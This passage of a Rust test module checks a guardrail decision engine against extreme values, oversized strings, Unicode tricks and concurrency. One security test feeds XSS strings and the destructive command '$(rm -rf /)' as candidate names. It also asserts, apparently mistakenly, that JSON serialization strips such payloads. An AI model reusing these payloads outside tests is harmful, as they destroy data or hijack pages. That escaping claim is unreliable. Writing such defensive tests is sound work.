        assert_eq!(outcome.reason, DecisionReason::TopCandidateBlockedFallbackUsed { fallback_rank: 1 });

        // Should have exactly 100 blocked candidates (every 100th starting from 0)
        assert_eq!(outcome.blocked.len(), 100);
        assert_eq!(outcome.blocked[0].candidate, c("candidate_00000"));
        assert_eq!(outcome.blocked[0].bayesian_rank, 0);
    }

    #[test]
    fn negative_system_state_with_extreme_and_invalid_floating_point_values() {
        // Test SystemState with various problematic floating point values
        let extreme_states = vec![
            ("positive_infinity_memory", |s: &mut SystemState| {
                s.memory_used_bytes = u64::MAX;
                s.memory_budget_bytes = u64::MAX;
                s.durability_level = f64::INFINITY;
            }),
            ("negative_infinity_durability", |s: &mut SystemState| {
                s.durability_level = f64::NEG_INFINITY;
            }),
            ("nan_durability", |s: &mut SystemState| {
                s.durability_level = f64::NAN;
            }),
            ("subnormal_durability", |s: &mut SystemState| {
                s.durability_level = f64::MIN_POSITIVE * 0.5; // Subnormal
            }),
            ("negative_zero_durability", |s: &mut SystemState| {
                s.durability_level = -0.0;
            }),
            ("extreme_precision_loss", |s: &mut SystemState| {
                s.durability_level = 1.0 + f64::EPSILON / 2.0; // Precision boundary
            }),
        ];

        let candidates = vec![ranked("test_candidate", 0.5, false)];

        for (description, state_modifier) in extreme_states {
            let mut state = healthy_state();
            state_modifier(&mut state);

            // Should handle extreme values gracefully without panic
            let outcome = engine().decide(&candidates, &default_monitors(), &state);

            // Most cases should result in blocked candidates due to guardrails
            // except for edge cases that might pass through
            match outcome.reason {
                DecisionReason::AllCandidatesBlocked => {
                    assert!(!outcome.blocked.is_empty(),
                           "Should have blocked candidates for: {}", description);
                }
                DecisionReason::TopCandidateAccepted => {
                    assert_eq!(outcome.chosen, Some(c("test_candidate")),
                             "Should accept candidate for: {}", description);
                }
                _ => panic!("Unexpected reason for: {}", description),
            }
        }
    }

    #[test]
    fn negative_blocked_candidate_with_massive_reason_strings() {
        // Test BlockedCandidate with extremely large reason strings
        let massive_reason = "R".repeat(1_000_000); // 1MB reason string
        let huge_guardrail_id = GuardrailId::new("G".repeat(500_000)); // 500KB guardrail ID
        let enormous_candidate_id = format!("C{}", "x".repeat(250_000)); // 250KB candidate ID

        let blocked = BlockedCandidate {
            candidate: c(&enormous_candidate_id),
            blocked_by: vec![huge_guardrail_id.clone()],
            bayesian_rank: usize::MAX, // Maximum rank value
            reasons: vec![massive_reason.clone()],
        };

        // Should handle massive fields without panic
        assert_eq!(blocked.candidate.0, enormous_candidate_id);
        assert_eq!(blocked.blocked_by[0].as_str().len(), 500_000);
        assert_eq!(blocked.reasons[0].len(), 1_000_000);
        assert_eq!(blocked.bayesian_rank, usize::MAX);

        // Test serialization performance with massive data
        let start = std::time::Instant::now();
        let json_result = serde_json::to_string(&blocked);
        let duration = start.elapsed();

        assert!(json_result.is_ok());
        assert!(duration < std::time::Duration::from_secs(15)); // Generous timeout

        // Test deserialization
        let json = json_result.unwrap();
        let parsed: BlockedCandidate = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed.reasons[0].len(), 1_000_000);
    }

    #[test]
    fn negative_decision_outcome_serialization_with_edge_case_data() {
        // Test DecisionOutcome serialization with various edge case data
        let edge_outcomes = vec![
            // Empty everything
            DecisionOutcome {
                chosen: None,
                blocked: Vec::new(),
                reason: DecisionReason::NoCandidates,
                epoch_id: 0,
            },
            // Maximum blocked candidates
            DecisionOutcome {
                chosen: None,
                blocked: (0..1000).map(|i| BlockedCandidate {
                    candidate: c(&format!("candidate_{}", i)),
                    blocked_by: vec![GuardrailId::new(&format!("guardrail_{}", i))],
                    bayesian_rank: i,
                    reasons: vec![format!("Reason {}", i)],
                }).collect(),
                reason: DecisionReason::AllCandidatesBlocked,
                epoch_id: u64::MAX,
            },
            // Unicode and special characters
            DecisionOutcome {
                chosen: Some(c("candidate_\u{1F600}\u{202E}test\u{202D}")),
                blocked: vec![BlockedCandidate {
                    candidate: c("blocked_\u{FEFF}candidate"),
                    blocked_by: vec![GuardrailId::new("guardrail_\u{200B}id")],
                    bayesian_rank: 42,
                    reasons: vec!["Reason with café\u{0301} and emoji \u{1F4A9}".to_string()],
                }],
                reason: DecisionReason::TopCandidateBlockedFallbackUsed { fallback_rank: 1 },
                epoch_id: 12345,
            },
        ];

        for (i, outcome) in edge_outcomes.into_iter().enumerate() {
            let start = std::time::Instant::now();
            let json = serde_json::to_string(&outcome).unwrap();
            let serialization_duration = start.elapsed();

            let parse_start = std::time::Instant::now();
            let parsed: DecisionOutcome = serde_json::from_str(&json).unwrap();
            let deserialization_duration = parse_start.elapsed();

            // Should handle serialization efficiently
            assert!(serialization_duration < std::time::Duration::from_secs(5));
            assert!(deserialization_duration < std::time::Duration::from_secs(5));

            // Should preserve data exactly
            assert_eq!(parsed.epoch_id, outcome.epoch_id);
            assert_eq!(parsed.reason, outcome.reason);
            assert_eq!(parsed.chosen, outcome.chosen);
            assert_eq!(parsed.blocked.len(), outcome.blocked.len());

            println!("Edge case {} completed in serialize: {:?}, deserialize: {:?}",
                    i, serialization_duration, deserialization_duration);
        }
    }

    #[test]
    fn negative_decision_reason_exhaustive_serialization_round_trips() {
        // Test all DecisionReason variants with edge case data
        let all_reasons = vec![
            DecisionReason::TopCandidateAccepted,
            DecisionReason::NoCandidates,
            DecisionReason::AllCandidatesBlocked,
            DecisionReason::TopCandidateBlockedFallbackUsed { fallback_rank: 0 },
            DecisionReason::TopCandidateBlockedFallbackUsed { fallback_rank: usize::MAX },
            DecisionReason::TopCandidateBlockedFallbackUsed { fallback_rank: usize::MAX / 2 },
        ];

        for reason in all_reasons {
            let outcome = DecisionOutcome {
                chosen: None,
                blocked: Vec::new(),
                reason: reason.clone(),
                epoch_id: 42,
            };

            let json = serde_json::to_string(&outcome).unwrap();
            let parsed: DecisionOutcome = serde_json::from_str(&json).unwrap();

            assert_eq!(parsed.reason, reason);

            // Test specific properties of fallback variants
            match &parsed.reason {
                DecisionReason::TopCandidateBlockedFallbackUsed { fallback_rank } => {
                    // Fallback rank should be preserved exactly
                    if let DecisionReason::TopCandidateBlockedFallbackUsed { fallback_rank: original_rank } = &reason {
                        assert_eq!(fallback_rank, original_rank);
                    }
                }
                _ => {} // Other variants have no additional data to verify
            }
        }
    }

    #[test]
    fn negative_concurrent_simulation_determinism_stress_test() {
        // Simulate concurrent access patterns to verify determinism under stress
        let candidates = vec![
            ranked("a", 0.7, false),
            ranked("b", 0.5, true),
            ranked("c", 0.3, false),
            ranked("d", 0.1, true),
        ];
        let monitors = default_monitors();
        let state = healthy_state();
        let engine = engine();

        // Run the same decision 1000 times rapidly to simulate concurrent access
        let mut outcomes = Vec::new();
        for _ in 0..1000 {
            let outcome = engine.decide(&candidates, &monitors, &state);
            push_bounded(&mut outcomes, outcome, 1500);
        }

        // All outcomes should be identical (determinism requirement)
        let first = &outcomes[0];
        for (i, outcome) in outcomes.iter().enumerate() {
            assert_eq!(outcome.chosen, first.chosen,
                      "Chosen candidate differs at iteration {}", i);
            assert_eq!(outcome.reason, first.reason,
                      "Decision reason differs at iteration {}", i);
            assert_eq!(outcome.blocked.len(), first.blocked.len(),
                      "Blocked count differs at iteration {}", i);
            assert_eq!(outcome.epoch_id, first.epoch_id,
                      "Epoch ID differs at iteration {}", i);

            // Verify blocked candidates are identical
            for (j, (blocked_a, blocked_b)) in outcome.blocked.iter().zip(first.blocked.iter()).enumerate() {
                assert_eq!(blocked_a.candidate, blocked_b.candidate,
                          "Blocked candidate {} differs at iteration {}", j, i);
                assert_eq!(blocked_a.bayesian_rank, blocked_b.bayesian_rank,
                          "Blocked rank {} differs at iteration {}", j, i);
                assert_eq!(blocked_a.blocked_by.len(), blocked_b.blocked_by.len(),
                          "Blocked reason count {} differs at iteration {}", j, i);
            }
        }
    }

    #[test]
    fn negative_boundary_candidate_rank_values_and_arithmetic_edge_cases() {
        // Test decision engine with boundary rank values
        let boundary_cases = vec![
            (0, "zero_rank"),
            (1, "one_rank"),
            (usize::MAX, "max_rank"),
            (usize::MAX / 2, "half_max_rank"),
            (usize::MAX - 1, "near_max_rank"),
        ];

        for (rank_value, description) in boundary_cases {
            let blocked = BlockedCandidate {
                candidate: c(&format!("candidate_{}", description)),
                blocked_by: vec![GuardrailId::new("test_guardrail")],
                bayesian_rank: rank_value,
                reasons: vec![format!("Blocked at rank {}", rank_value)],
            };

            // Should handle boundary rank values without overflow
            assert_eq!(blocked.bayesian_rank, rank_value);

            // Test in DecisionReason context
            if rank_value < 1000 {  // Avoid creating huge candidate arrays
                let reason = DecisionReason::TopCandidateBlockedFallbackUsed {
                    fallback_rank: rank_value
                };

                let outcome = DecisionOutcome {
                    chosen: Some(c(&format!("chosen_{}", description))),
                    blocked: vec![blocked],
                    reason: reason.clone(),
                    epoch_id: rank_value as u64,
                };

                // Should serialize/deserialize boundary values correctly
                let json = serde_json::to_string(&outcome).unwrap();
                let parsed: DecisionOutcome = serde_json::from_str(&json).unwrap();

                assert_eq!(parsed.blocked[0].bayesian_rank, rank_value);
                if let DecisionReason::TopCandidateBlockedFallbackUsed { fallback_rank } = parsed.reason {
                    assert_eq!(fallback_rank, rank_value);
                }
            }
        }
    }

    #[test]
    fn negative_guardrail_id_consistency_under_various_string_operations() {
        // Test GuardrailId behavior with various string manipulation edge cases
        let test_strings = vec![
            "",                                    // Empty string
            " ",                                   // Single space
            "\t\n\r",                             // Whitespace only
            "\0",                                  // Null character
            "\u{FEFF}BOM",                        // BOM character
            "a\u{0308}",                          // Combining character
            "𝕊𝕡𝕖𝕔𝕚𝕒𝕝",                          // Mathematical alphanumeric symbols
            "🦀🚀💥",                             // Multiple emoji
            "test".repeat(1000),                   // Very long string
        ];

        for test_string in test_strings {
            let id1 = GuardrailId::new(&test_string);
            let id2 = GuardrailId::new(test_string.clone());

            // Should maintain string consistency
            assert_eq!(id1.as_str(), test_string);
            assert_eq!(id2.as_str(), test_string);
            assert_eq!(id1.to_string(), test_string);
            assert_eq!(id2.to_string(), test_string);

            // Should be equal when created from same string
            assert_eq!(id1, id2);

            // Should maintain consistency in collections
            use std::collections::HashSet;
            let mut set = HashSet::new();
            set.insert(id1.clone());
            assert!(set.contains(&id2));

            // Should serialize consistently
            let json1 = serde_json::to_string(&id1).unwrap();
            let json2 = serde_json::to_string(&id2).unwrap();
            assert_eq!(json1, json2);

            let parsed1: GuardrailId = serde_json::from_str(&json1).unwrap();
            let parsed2: GuardrailId = serde_json::from_str(&json2).unwrap();
            assert_eq!(parsed1, id1);
            assert_eq!(parsed2, id2);
        }
    }

    // -- Negative-path Security Tests ---------------------------------------
    // Added 2026-04-17: Comprehensive security hardening tests

    #[test]
    fn test_security_unicode_injection_in_guardrail_ids_and_candidates() {
        use crate::security::constant_time::ct_eq;

        let engine = engine();
        let mut system_state = healthy_state();

        // Unicode injection attempts in guardrail IDs and candidate references
        let malicious_candidates = vec![
            ranked("\u{202E}safe-candidate\u{202D}malicious", 0.9, false),  // BiDi override
            ranked("candidate\u{200B}001", 0.8, false),  // Zero-width space
            ranked("secure\u{FEFF}candidate", 0.7, false),  // Zero-width no-break space
            ranked("\u{0000}bypass", 0.6, false),  // Null injection
            ranked("candidate\u{2028}injection", 0.5, false),  // Line separator
        ];

        let monitors = default_monitors();
        let decision = engine.decide(&malicious_candidates, &monitors, &system_state);

        // Unicode should not affect decision logic
        match decision.reason {
            DecisionReason::TopCandidateAccepted |
            DecisionReason::TopCandidateBlockedFallbackUsed { .. } => {
                if let Some(chosen) = &decision.chosen {
                    // Chosen candidate should not be manipulated by Unicode normalization
                    assert!(!ct_eq(chosen.as_str().as_bytes(), b"malicious"),
                           "Unicode injection should not create malicious candidates");
                }
            },
            _ => {
                // Other outcomes are acceptable for security
            }
        }

        // Blocked candidates should preserve original references
        for blocked in &decision.blocked {
            assert!(!blocked.candidate.as_str().contains('\0'),
                   "Null bytes should not appear in candidate references");
            assert!(!blocked.reasons.iter().any(|r| r.contains('\0')),
                   "Null bytes should not appear in blocking reasons");

            // Guardrail IDs should not be manipulated
            for guardrail_id in &blocked.blocked_by {
                assert!(!ct_eq(guardrail_id.as_str().as_bytes(), b"bypass"),
                       "Unicode injection should not create bypass guardrails");
            }
        }
    }

    #[test]
    fn test_security_memory_exhaustion_through_large_candidate_sets() {
        let engine = engine();
        let system_state = healthy_state();
        let monitors = default_monitors();

        // Attempt memory exhaustion through massive candidate sets
        let mut large_candidate_set = vec![];
        for i in 0..100_000 {
            push_bounded(&mut large_candidate_set, ranked(
                &format!("candidate_{}", i),
                0.5 + (i as f64 / 200_000.0),  // Varying posteriors
                false
            ), 10000);
        }

        // Should either handle gracefully or reject
        let decision_result = std::panic::catch_unwind(|| {
            engine.decide(&large_candidate_set, &monitors, &system_state)
        });

        match decision_result {
            Ok(decision) => {
                // If processing succeeded, verify decision integrity
                match decision.reason {
                    DecisionReason::TopCandidateAccepted |
                    DecisionReason::TopCandidateBlockedFallbackUsed { .. } => {
                        assert!(decision.chosen.is_some(), "Decision should have chosen candidate");
                    },
                    DecisionReason::AllCandidatesBlocked => {
                        assert!(decision.chosen.is_none(), "No candidate should be chosen when all blocked");
                        assert_eq!(decision.blocked.len(), large_candidate_set.len(),
                                 "All candidates should be reported as blocked");
                    },
                    DecisionReason::NoCandidates => {
                        panic!("Should not report no candidates when candidates were provided");
                    }
                }

                // Decision should be deterministic even with large sets
                let second_decision = engine.decide(&large_candidate_set, &monitors, &system_state);
                assert_eq!(decision.reason, second_decision.reason,
                         "Decision should be deterministic with large candidate sets");
            },
            Err(_) => {
                // Graceful panic handling is acceptable for extreme memory pressure
            }
        }
        // Test should complete without OOM
    }

    #[test]
    fn test_security_decision_manipulation_through_extreme_posteriors() {
        let engine = engine();
        let system_state = healthy_state();
        let monitors = default_monitors();

        // Test with extreme posterior probability values
        let extreme_candidates = vec![
            ranked("extreme_high", f64::INFINITY, false),  // Positive infinity
            ranked("extreme_low", f64::NEG_INFINITY, false),  // Negative infinity
            ranked("not_a_number", f64::NAN, false),  // NaN
            ranked("above_one", 1.0000000000000002, false),  // Slightly above 1.0
            ranked("below_zero", -0.0000000000000001, false),  // Slightly below 0.0
            ranked("max_float", f64::MAX, false),  // Maximum float
            ranked("min_float", f64::MIN, false),  // Minimum float
            ranked("epsilon", f64::EPSILON, false),  // Machine epsilon
        ];

        let decision = engine.decide(&extreme_candidates, &monitors, &system_state);

        // Extreme values should not bypass decision logic
        match decision.reason {
            DecisionReason::TopCandidateAccepted => {
                if let Some(chosen) = &decision.chosen {
                    // Verify chosen candidate has reasonable properties
                    for candidate in &extreme_candidates {
                        if candidate.candidate_ref.as_str() == chosen.as_str() {
                            assert!(candidate.posterior_prob.is_finite() ||
                                   candidate.posterior_prob.is_infinite() && candidate.posterior_prob > 0.0,
                                   "Only finite or positive infinite posteriors should be chosen");
                            break;
                        }
                    }
                }
            },
            DecisionReason::TopCandidateBlockedFallbackUsed { fallback_rank } => {
                assert!(fallback_rank < extreme_candidates.len(),
                       "Fallback rank should be within candidate bounds");
            },
            DecisionReason::AllCandidatesBlocked => {
                // Expected behavior for extreme values that violate guardrails
            },
            DecisionReason::NoCandidates => {
                panic!("Should not report no candidates when candidates were provided");
            }
        }

        // Decision should be deterministic even with extreme values
        let second_decision = engine.decide(&extreme_candidates, &monitors, &system_state);
        assert_eq!(decision.reason, second_decision.reason,
                 "Decision should be deterministic with extreme posterior values");
    }

    #[test]
    fn test_security_guardrail_bypass_attempts() {
        let engine = engine();
        let monitors = default_monitors();

        // Attempt to bypass guardrails through system state manipulation
        let bypass_states = vec![
            SystemState {
                memory_used_bytes: 0,  // Attempt to show no memory usage
                memory_budget_bytes: u64::MAX,  // Extreme budget to avoid memory checks
                durability_level: 1.0,  // Perfect durability
                hardening_level: HardeningLevel::Standard,
                proposed_hardening_level: None,
                evidence_emission_active: false,  // Disable evidence
                memory_tail_risk: None,
                reliability_telemetry: None,
                epoch_id: u64::MAX,  // Extreme epoch
            },
            SystemState {
                memory_used_bytes: u64::MAX,  // Extreme memory usage
                memory_budget_bytes: 1,  // Minimal budget to trigger constraints
                durability_level: 0.0,  // No durability
                hardening_level: HardeningLevel::Standard,
                proposed_hardening_level: Some(HardeningLevel::Standard),
                evidence_emission_active: true,
                memory_tail_risk: Some(0.99),  // High tail risk
                reliability_telemetry: None,
                epoch_id: 0,  // Zero epoch
            },
        ];

        let normal_candidates = vec![
            ranked("candidate_a", 0.9, false),
            ranked("candidate_b", 0.8, false),
            ranked("candidate_c", 0.7, false),
        ];

        for bypass_state in bypass_states {
            let decision = engine.decide(&normal_candidates, &monitors, &bypass_state);

            // Guardrails should still enforce constraints regardless of state manipulation
            match decision.reason {
                DecisionReason::AllCandidatesBlocked => {
                    // Expected when system state violates guardrails
                    assert!(decision.chosen.is_none());
                    assert!(!decision.blocked.is_empty());
                },
                DecisionReason::TopCandidateAccepted |
                DecisionReason::TopCandidateBlockedFallbackUsed { .. } => {
                    // If a candidate was chosen, verify guardrail constraints were respected
                    assert!(decision.chosen.is_some());

                    // Should not bypass fundamental constraints
                    if bypass_state.memory_used_bytes > bypass_state.memory_budget_bytes {
                        assert!(!decision.blocked.is_empty(),
                               "Memory constraint violations should block candidates");
                    }
                },
                DecisionReason::NoCandidates => {
                    panic!("Should not report no candidates when candidates were provided");
                }
            }

            // Decision should still be deterministic
            let second_decision = engine.decide(&normal_candidates, &monitors, &bypass_state);
            assert_eq!(decision.reason, second_decision.reason,
                     "Decision should be deterministic even with manipulated system state");
        }
    }

    #[test]
    fn test_security_json_serialization_injection_prevention() {
        let engine = engine();
        let system_state = healthy_state();
        let monitors = default_monitors();

        // Candidates and decision reasons with injection attempts
        let injection_candidates = vec![
            ranked("\";alert('xss');//", 0.9, false),  // JS injection
            ranked("candidate</script><script>alert('xss')</script>", 0.8, false),  // HTML injection
            ranked("$(rm -rf /)", 0.7, false),  // Command injection
            ranked("line1\nline2\r\nline3", 0.6, false),  // Newline injection
            ranked("quote\"injection'test", 0.5, false),  // Quote injection
        ];

        let decision = engine.decide(&injection_candidates, &monitors, &system_state);

        // Serialize decision to JSON
        let json = serde_json::to_string(&decision).expect("should serialize");

        // JSON should escape all injection attempts
        assert!(!json.contains("alert('xss')"), "JavaScript injection should be escaped");
        assert!(!json.contains("</script>"), "HTML injection should be escaped");
        assert!(!json.contains("rm -rf"), "Command injection should be escaped");
        assert!(!json.contains("\n"), "Newline injection should be escaped");
        assert!(!json.contains("\r"), "Carriage return injection should be escaped");

        // Roundtrip should preserve structure but escape content
        let parsed: DecisionOutcome = serde_json::from_str(&json).expect("should deserialize");
        assert_eq!(decision.reason, parsed.reason);
        assert_eq!(decision.epoch_id, parsed.epoch_id);
        assert_eq!(decision.blocked.len(), parsed.blocked.len());

        // Verify candidate references are preserved but safe
        if let Some(chosen) = &decision.chosen {
            assert_eq!(chosen.as_str(), parsed.chosen.as_ref().unwrap().as_str());
        }
    }

    #[test]
    fn test_security_concurrent_decision_making_safety() {
        use std::sync::{Arc, Mutex};
        use std::thread;

        let engine = Arc::new(engine());
        let mut handles = vec![];

        // Spawn concurrent decision operations
        for i in 0..20 {
            let engine_clone = Arc::clone(&engine);
            let handle = thread::spawn(move || {
                let candidates = vec![
                    ranked(&format!("candidate_{}_a", i), 0.9 - (i as f64 / 100.0), false),
                    ranked(&format!("candidate_{}_b", i), 0.8 - (i as f64 / 100.0), false),
                    ranked(&format!("candidate_{}_c", i), 0.7 - (i as f64 / 100.0), false),
                ];

                let mut system_state = healthy_state();
                system_state.epoch_id = 42 + i as u64;
                system_state.memory_used_bytes += (i as u64 * 1_000_000);  // Varying memory usage

                let monitors = default_monitors();
                engine_clone.decide(&candidates, &monitors, &system_state)
            });
            push_bounded(&mut handles, handle, 200);
        }

        // Collect results
        let mut results = vec![];
        for handle in handles {
            let result = handle.join().expect("thread should not panic");
            push_bounded(&mut results, result, 200);
        }

        // Verify all decisions completed successfully
        for (i, decision) in results.iter().enumerate() {
            // Decision should have been made
            match decision.reason {
                DecisionReason::NoCandidates => {
                    panic!("Thread {} should not report no candidates", i);
                },
                _ => {
                    // All other outcomes are valid
                }
            }

            // Epoch ID should be preserved
            assert_eq!(decision.epoch_id, 42 + i as u64,
                     "Epoch ID should be preserved in concurrent decisions");

            // Decision structure should be intact
            assert!(decision.blocked.len() <= 3, "Should not have more blocked candidates than provided");
        }
    }

    #[test]
    fn test_security_arithmetic_overflow_in_rankings_and_epochs() {
        let engine = DecisionEngine::new(u64::MAX);  // Extreme epoch
        let monitors = default_monitors();

        // System state with extreme values
        let extreme_state = SystemState {
            memory_used_bytes: u64::MAX - 1,
            memory_budget_bytes: u64::MAX,
            durability_level: 1.0,
            hardening_level: HardeningLevel::Standard,
            proposed_hardening_level: None,
            evidence_emission_active: true,
            memory_tail_risk: Some(1.0),
            reliability_telemetry: None,
            epoch_id: u64::MAX,  // Maximum epoch
        };

        // Candidates with extreme rankings
        let mut extreme_candidates = vec![];
        for i in 0..1000 {
            push_bounded(&mut extreme_candidates, RankedCandidate {
                candidate_ref: c(&format!("candidate_{}", i)),
                posterior_prob: 0.5,
                prior_prob: 0.5,
                observation_count: usize::MAX,  // Extreme observation count
                confidence_interval: (0.0, 1.0),
                guardrail_filtered: false,
            }, 2000);
        }

        let decision = engine.decide(&extreme_candidates, &monitors, &extreme_state);

        // Decision should handle extreme values without overflow
        assert_eq!(decision.epoch_id, u64::MAX, "Epoch ID should be preserved");

        match decision.reason {
            DecisionReason::TopCandidateBlockedFallbackUsed { fallback_rank } => {
                assert!(fallback_rank < extreme_candidates.len(),
                       "Fallback rank should not overflow");
            },
            DecisionReason::AllCandidatesBlocked => {
                // Expected due to extreme memory usage
                assert_eq!(decision.blocked.len(), extreme_candidates.len(),
                         "All candidates should be blocked");

                for blocked in &decision.blocked {
                    assert!(blocked.bayesian_rank < extreme_candidates.len(),
                           "Bayesian rank should not overflow");
                }
            },
            _ => {
                // Other outcomes are acceptable
            }
        }
    }

    #[test]
    fn test_security_system_state_manipulation_resistance() {
        let engine = engine();
        let monitors = default_monitors();

        let candidates = vec![
            ranked("candidate_a", 0.9, false),
            ranked("candidate_b", 0.8, false),
        ];

        // System states designed to manipulate decision logic
        let manipulated_states = vec![
            SystemState {
                memory_used_bytes: 0,
                memory_budget_bytes: 0,  // Zero budget (divide by zero attempt)
                durability_level: f64::INFINITY,  // Infinite durability
                hardening_level: HardeningLevel::Standard,
                proposed_hardening_level: None,
                evidence_emission_active: true,
                memory_tail_risk: Some(f64::NAN),  // NaN risk
                reliability_telemetry: None,
                epoch_id: 42,
            },
            SystemState {
                memory_used_bytes: u64::MAX,
                memory_budget_bytes: 1,
                durability_level: f64::NEG_INFINITY,  // Negative infinite durability
                hardening_level: HardeningLevel::Standard,
                proposed_hardening_level: None,
                evidence_emission_active: true,
                memory_tail_risk: Some(-1.0),  // Negative risk
                reliability_telemetry: None,
                epoch_id: 42,
            },
        ];

        for manipulated_state in manipulated_states {
            let decision_result = std::panic::catch_unwind(|| {
                engine.decide(&candidates, &monitors, &manipulated_state)
            });

            match decision_result {
                Ok(decision) => {
                    // If decision succeeded, verify it's sensible
                    match decision.reason {
                        DecisionReason::AllCandidatesBlocked => {
                            // Expected for invalid system states
                            assert!(decision.chosen.is_none());
                        },
                        DecisionReason::TopCandidateAccepted |
                        DecisionReason::TopCandidateBlockedFallbackUsed { .. } => {
                            // Should only happen if guardrails handle extreme values gracefully
                            assert!(decision.chosen.is_some());
                        },
                        DecisionReason::NoCandidates => {
                            panic!("Should not report no candidates when candidates were provided");
                        }
                    }

                    // Decision should include the epoch from the (possibly manipulated) state
                    assert_eq!(decision.epoch_id, manipulated_state.epoch_id);
                },
                Err(_) => {
                    // Graceful panic for invalid system states is acceptable
                }
            }
        }
    }

    #[test]
    fn test_security_blocked_candidate_reason_injection() {
        let engine = engine();

        // Create a mock monitor set that produces injection attempts in reasons
        let monitors = GuardrailMonitorSet::with_defaults();
        let mut system_state = healthy_state();

        // Force memory constraint violation to trigger blocking
        system_state.memory_used_bytes = system_state.memory_budget_bytes + 1_000_000_000;

        let candidates = vec![
            ranked("candidate_a", 0.9, false),
            ranked("candidate_b", 0.8, false),
        ];

        let decision = engine.decide(&candidates, &monitors, &system_state);

        // Should block due to memory constraint
        match decision.reason {
            DecisionReason::AllCandidatesBlocked => {
                assert!(!decision.blocked.is_empty(), "Should have blocked candidates");

                for blocked in &decision.blocked {
                    // Verify blocking reasons don't contain injection attempts
                    for reason in &blocked.reasons {
                        assert!(!reason.contains("</script>"), "Reason should not contain HTML injection");
                        assert!(!reason.contains("alert("), "Reason should not contain JS injection");
                        assert!(!reason.contains("$("), "Reason should not contain command injection");
                        assert!(!reason.contains('\0'), "Reason should not contain null bytes");
                        assert!(!reason.is_empty(), "Reason should not be empty");
                    }

                    // Guardrail IDs should be valid
                    for guardrail_id in &blocked.blocked_by {
                        assert!(!guardrail_id.as_str().contains('\0'),
                               "Guardrail ID should not contain null bytes");
                        assert!(!guardrail_id.as_str().is_empty(),
                               "Guardrail ID should not be empty");
                    }

                    // Bayesian rank should be within bounds
                    assert!(blocked.bayesian_rank < candidates.len(),
                           "Bayesian rank should be within candidate bounds");
                }
            },
            _ => {
                // Other outcomes possible depending on guardrail behavior
            }
        }
    }
}
